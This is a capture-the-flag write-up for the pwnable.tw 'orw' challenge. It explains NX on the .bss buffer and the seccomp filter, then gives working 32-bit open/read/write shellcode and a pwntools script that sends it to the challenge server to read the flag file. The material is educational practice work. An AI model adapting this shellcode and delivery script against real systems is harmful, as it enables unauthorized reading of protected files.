## Overview
This challenge had no vulnerability, it was just a straightforward shellcode challenge. The goal is to read `/home/orw/flag` using only the `open`, `read`, and `write` system calls.

#### Issues I ran into
When I first started testing shellcode against this challenge, the shellcode would simply just not execute. I would open it in pwndbg, it would jump to the shellcode and as I attempted to step through the instructions it would not run the instruction. I later found out this is because it writes the shellcode into a `.bss` buffer and `call`'s it directly. On modern kernels the `.bss` is non-executable (NX), so jumping to it directly won't execute. Older kernels treat readable pages as executable that `setarch -X` sets. That is why it runs on the remote target and why running it locally won't work until `setarch` is run against the binary. 

I figured out it wrote shellcode into the `.bss` buffer by stepping through the instructions in pwndbg, then running `vmmap` to see where that buffer was located:

![pwndbg buffer screenshot](/assets/images/pwnable.tw-orw/buffer_location.png)
- `vmmap` shows the page level mapping the buffer lives in which tells us `rw-` (writable, non-executable), which is why the shellcode was failing locally. Next, to find which section it's in we match the exact shellcode buffer location with the `readelf` output.

```
readelf -s ./orw | grep 0804a0
24: 0804a000     0 SECTION LOCAL  DEFAULT   24 .got.plt
25: 0804a020     0 SECTION LOCAL  DEFAULT   25 .data
26: 0804a040     0 SECTION LOCAL  DEFAULT   26 .bss
```

## Seccomp filter
The function `orw_seccomp` installs a BPF filter with two `prctl` system calls

![prctl code screenshot](/assets/images/pwnable.tw-orw/prctl.png)

These two function calls are basically loading the filter, and then installing it. This works because of BPF offering an in-kernel virtual machine that is able to run code and monitor it. In this case, monitoring for any system calls other than `open`, `read`, and `write` and blocking them.

## Writing the Shellcode
This was pretty straightforward, I just had to look up the according system call numbers, set the registers to the appropriate values and perform a syscall. The challenge with this was the 32-bit assembly. 

```nasm
; open("///home/orw/flag", O_RDONLY, 0)
xor eax, eax
push eax
push 0x67616c66
push 0x2f77726f
push 0x2f656d6f
push 0x682f2f2f
mov  ebx, esp
xor ecx, ecx
xor edx, edx
push 5 ; pop eax
int 0x80

; read(fd, buf, 0x100)  ; buf = esp, the path is overwritten by the file contents
mov ebx, eax
mov ecx, esp
mov edx, 0x100
push 3 ; pop eax
int 0x80

; write(1, buf, nbytes)
mov edx, eax
push 1 ; pop ebx
push 4 ; pop eax
int 0x80

; exit(0)
xor ebx, ebx
push 1 ; pop eax
int 0x80
```
- Comments were added to help make the asm easier to read.
- You can test or debug the shellcode locally by creating the `/home/orw/flag` file and adding text inside within `0x100` bytes.

The path is built on the stack (pushed in reverse, little-endian dwords). Then the file descriptor (fd) from `open` (returned in `eax`) is put into `ebx` before setting up `read`.

## Final Pwn
We have the working shellcode so now the only thing left to do is add it into a script to connect to the remote target
```python
from pwn import *

BINARY = './orw'
elf = context.binary = ELF(BINARY, checksec=False)
context.terminal = ['tmux', 'splitw', '-v']

shellcode = asm('''
    xor eax, eax
    push eax
    push 0x67616c66
    push 0x2f77726f
    push 0x2f656d6f
    push 0x682f2f2f
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    push 5
    pop eax
    int 0x80

    mov ebx, eax
    mov ecx, esp
    mov edx, 0x100
    push 3
    pop eax
    int 0x80

    mov edx, eax
    push 1
    pop ebx
    push 4
    pop eax
    int 0x80

    xor ebx, ebx
    push 1
    pop eax
    int 0x80
''')


def start():
    if args.REMOTE:
        return remote('chall.pwnable.tw', 10001)
    return process(['setarch', '-X', BINARY])


io = start()
io.sendlineafter(b'Give my your shellcode:', shellcode)
print(io.recvall())
```
